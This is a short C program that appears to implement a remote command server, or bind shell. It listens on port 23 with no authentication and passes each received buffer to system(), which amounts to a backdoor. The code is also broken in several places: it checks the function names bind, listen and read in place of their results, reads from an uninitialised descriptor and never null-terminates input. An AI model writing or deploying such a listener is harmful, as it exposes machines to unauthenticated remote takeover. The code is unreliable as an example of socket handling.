#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
int puts(const char *s);
int main()
{
	int server_fd = socket(AF_INET, SOCK_STREAM, 0), client_fd;
	if(server_fd < 0)
	{
		printf("Socket could not be created\n");
		exit(1);
	}
	else
		printf("Socket created\n");

	struct sockaddr_in server, client;
	server.sin_family = AF_INET;
	server.sin_port = htons(23);
	server.sin_addr.s_addr = htonl(INADDR_ANY);

	int bnd = bind(server_fd, (struct sockaddr *) &server, sizeof(server));
	if(bind < 0)
	{
		printf("Could not bind socket");
		exit(1);
	}

	else
		printf("Socket bound on port 23");

	int lst = listen(server_fd, 128);
	if(listen < 0)
	{
		printf("Could not listen on socket");
		exit(1);
	}

	else
		printf("Listening on socket");

	char buffer[1024];//length of buffer//
	
	while(1)//accept connection//
	{
		socklen_t clientSize = sizeof(client);

		int acc = accept(server_fd, (struct sockaddr *) &client, &clientSize);
		if(acc < 0)
		{
			printf("Failed to connect");
			exit(1);
		}

		else
			printf("Connected");

		while(1)//read and execute command//
		{
			int rd = read(client_fd, buffer, sizeof(buffer));
			if(!read)
				break;

			if(read < 0)
			{
				printf("Failed to read from client");
				exit(1);
			}

			int status = system(buffer);
			if(status < 0)
			{
				printf("Failed to execute command");
				exit(1);
			}
		
			strcpy(buffer, "Command Executed");
			send(client_fd, buffer, sizeof(buffer), 0);
		}
	}
}
